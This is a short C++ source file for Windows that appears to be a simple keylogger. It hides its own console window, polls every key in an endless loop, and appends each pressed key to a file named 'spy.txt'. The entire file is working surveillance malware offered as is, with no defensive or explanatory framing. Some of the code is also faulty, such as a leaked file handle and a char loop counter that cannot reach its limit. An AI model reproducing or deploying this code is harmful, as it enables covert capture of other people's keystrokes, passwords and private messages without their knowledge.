#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;
int SaveFile(int key, const char* file)
{
	FILE* OUTPUT_F;
	OUTPUT_F = fopen(file, "a+");
	for (int i = 0; i < 20; i++)
	{
		if (i == key)
			return 0;
	}
	fprintf(OUTPUT_F, " %c ", key);
	fclose(OUTPUT_F);
	return 0;
}

int main()
{
	HWND StealthMode;
	AllocConsole();
	StealthMode = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(StealthMode, 0);
	char i;
	FILE* fd = fopen("spy.txt", "w");
	fclose(fd);
	while (1)
	{
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				cout << i << endl;
				SaveFile(i, "spy.txt");
			}
		}
	}
	return 0;
}
